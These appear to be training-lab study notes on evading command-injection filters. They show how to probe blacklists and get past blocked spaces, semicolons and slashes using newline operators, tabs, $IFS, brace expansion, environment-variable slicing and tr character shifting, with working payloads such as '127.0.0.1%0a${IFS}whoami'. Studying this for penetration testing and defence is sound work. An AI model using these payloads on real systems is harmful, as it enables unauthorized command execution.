# Identifying Filters

When a payload like `127.0.0.1; whoami` comes back as "invalid input," something on the backend detected it. Two things tell you _what_ is blocking it:

- **Where the error appears** — if it shows up in the normal output area of the page, it's the web application itself (PHP, Node, etc.) doing the check. If you get redirected to a separate error page with your IP and request details, that's more likely a WAF.
- **What triggered it** — narrow it down character by character.

A basic PHP blacklist might look like this:

```php
$blacklist = ['&', '|', ';', ...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

It just checks if any blacklisted string appears anywhere in your input. No parsing, no context — if the character is present, the request is dead.

## Finding what's blocked

Test incrementally. Start from a known-good input and add one thing at a time:

```
127.0.0.1       → works
127.0.0.1;      → blocked? → semicolon is blacklisted
127.0.0.1%0a    → blocked? → newline is blacklisted
127.0.0.1 whoami → blocked? → space is blacklisted, or "whoami" is
```

Once you know which character triggers the block, you can look for alternatives. The goal is figuring out exactly what's on the blacklist so you know what you need to work around — not just that _something_ is blocked.

# Bypassing Space Filters

## Operators first

Before worrying about spaces, you need a working injection operator. Most are blacklisted, but the newline character (`%0a`) often isn't — it's frequently needed in legitimate payloads so developers leave it alone. It works on both Linux and Windows for chaining commands.

So start with `127.0.0.1%0a` and confirm it goes through before building the rest of the payload.

## Space bypass techniques

Once you have a working operator but the space is blocked (`127.0.0.1%0a whoami` → invalid input), you have a few options:

### Tab (`%09`)

Both Linux and Windows treat tabs between command arguments the same as spaces:

```
127.0.0.1%0a%09whoami
```

### `$IFS`

The Linux `$IFS` (Internal Field Separator) variable defaults to space + tab. The shell expands it before the command runs, so it never appears as a literal space in your payload:

```
127.0.0.1%0a${IFS}whoami
```

### Brace expansion

Bash brace expansion lets you pass arguments without any spaces at all:

```bash
{ls,-la}    # shell expands this to: ls -la
```

In a payload:

```
127.0.0.1%0a{whoami}
127.0.0.1%0a{ls,-la}
```


More space bypass techniques: [PayloadsAllTheThings — writing commands without spaces](https://github.com/swisskyrepo/PayloadsAllTheThings)

# Bypassing Other Blacklisted Characters

Slashes and backslashes get blacklisted a lot because they're required to specify paths. The workaround is to never type the character directly — extract it from somewhere the shell already has it.
## Linux — environment variable slicing

Environment variables often contain the characters you need. You can extract a single character by specifying a start position and length:

```bash
echo ${PATH:0:1}      # → /   (PATH starts with /usr/...)
echo ${HOME:0:1}      # → /   (same idea)
echo ${LS_COLORS:10:1} # → ;  (semi-colon is at index 10)
```

Syntax: `${VARIABLE:start:length}`

To find useful characters in other variables:

```bash
printenv    # lists all environment variables
```

Pick one that contains the character you need, then figure out its index. In a payload, you don't wrap it in `echo` — just use the substitution directly:

```
127.0.0.1${LS_COLORS:10:1}${IFS}whoami
#          ^semicolon       ^space
```

## Windows — CMD

CMD uses a different slicing syntax with `%VAR:~start,end%`. Negative end means "count from the end":

```cmd
echo %HOMEPATH:~6,-11%    # → \
# %HOMEPATH% = \Users\htb-student
# ~6 skips "\Users", -11 drops "htb-student"
```

## Windows — PowerShell

PowerShell treats strings as arrays, so you can index directly:

```powershell
$env:HOMEPATH[0]        # → \
$env:PROGRAMFILES[10]   # → \
```

List all env vars to find useful characters:

```powershell
Get-ChildItem Env:
```

## Character shifting (Linux)

Instead of extracting a character from a variable, you can shift an adjacent ASCII character up by one. Find the character just before your target in the ASCII table (`man ascii`), then pass it through `tr`:

```bash
# Backslash \ = ASCII 92, the character before it is [ = ASCII 91
echo $(tr '!-}' '"-~' <<< [)    # → \
```

The `tr` range `'!-}'` maps to `'"-~'`, shifting every character up by 1. So `[` (91) becomes `\` (92).
